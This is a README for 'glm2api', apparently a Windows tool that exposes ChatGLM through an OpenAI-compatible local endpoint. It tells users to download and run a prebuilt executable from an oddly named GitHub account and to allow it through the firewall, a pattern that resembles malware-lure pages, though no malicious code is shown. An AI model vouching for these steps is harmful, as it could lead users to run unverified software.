# 🤖 glm2api - Use OpenAI tools with ChatGLM easily

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Foxtalbotblackolive1624/glm2api/releases)

## What this program does

The glm2api software acts as a bridge. It takes the output from ChatGLM and changes it into a format that OpenAI tools understand. Many apps and websites require an OpenAI connection to work. This tool allows those apps to talk to ChatGLM instead. You gain the power of OpenAI software without changing your preferred AI provider.

## ⚙️ System Requirements

This software works on Windows 10 and Windows 11. Your computer needs at least 4GB of memory. You do not need a powerful graphics card to run the bridge service. Ensure you have a stable internet connection. The program interacts with web servers through port 8000 by default. Please verify that other programs do not block this port.

## 📥 Getting Started

Follow these steps to set up the software on your computer.

1. Visit the [official releases page](https://github.com/Foxtalbotblackolive1624/glm2api/releases) to download the package.
2. Look for the file ending in `.zip` in the latest release section.
3. Click the filename to save it to your computer.
4. Open your Downloads folder.
5. Right-click the file and choose the option to extract all.
6. Pick a folder for the files.
7. Open the folder you created.
8. Double-click the file named `glm2api.exe` to run the program.

A black window will appear on your screen. This window shows the status of the tool. Do not close this window while you use the software.

## 🛠️ Configuring the Link

Once the program runs, it establishes an address on your own machine. This address acts as the gateway for your apps. 

1. Open the application you want to connect.
2. Find the settings menu for API keys or base URLs.
3. Replace the official OpenAI address with `http://localhost:8000/v1`.
4. Enter any text in the API key field. The program accepts dummy keys.
5. Save your changes.

The bridge now routes data from your app through the glm2api service and sends it to ChatGLM.

## 📖 Frequently Asked Questions

### Does the program send my data to third parties?
The program runs entirely on your local machine. It acts as a middleman. It directs your requests to ChatGLM and returns the results to you. It does not store your history or logs on a cloud server.

### What should I do if the windows closes immediately?
Check if you extracted the files from the zip folder first. Running the program from inside a compressed zip folder often causes errors. Move the files to your Documents or Desktop folder and try again.

### Can I change the port number?
Yes. Open the configuration file named `config.json` in the program folder using Notepad. Find the line that lists "port" and change the number. Save the file and restart the program. Ensure your apps use the new port number in their settings.

### Does the program need an internet connection?
Yes. The tool must reach the ChatGLM servers to fetch data. If your connection drops, the apps connected to this bridge will fail to receive responses.

## 🛡️ Troubleshooting Common Issues

If you face errors, follow these steps to narrow down the cause.

* **Check the status:** Observe the text in the black window. It shows log entries. If the logs show "connection refused," the program cannot reach the target server. Check your internet settings or firewall permissions.
* **Firewall blocks:** Windows Firewall may ask for permission to let this program communicate. Click allow when the prompt appears. If you do not see a prompt, check your Control Panel settings and add an exception for the program file.
* **Multiple instances:** Only one instance of the program should run at once. If you start it twice, the program will report that the port is in use. Close all open instances and start the program again.
* **Updates:** Check the download page periodically for new versions. Developers update the bridge to match changes in the service providers. Keeping the software current prevents compatibility errors.

## 🚀 Performance Tips

The program consumes very little power. However, ensure that your power settings allow background processes if you plan to keep the bridge running for long periods. Set your computer sleep mode to never if you use this as a server for other devices on your home network. You can minimize the program window to the taskbar to keep your workspace clear. The program continues to function while minimized.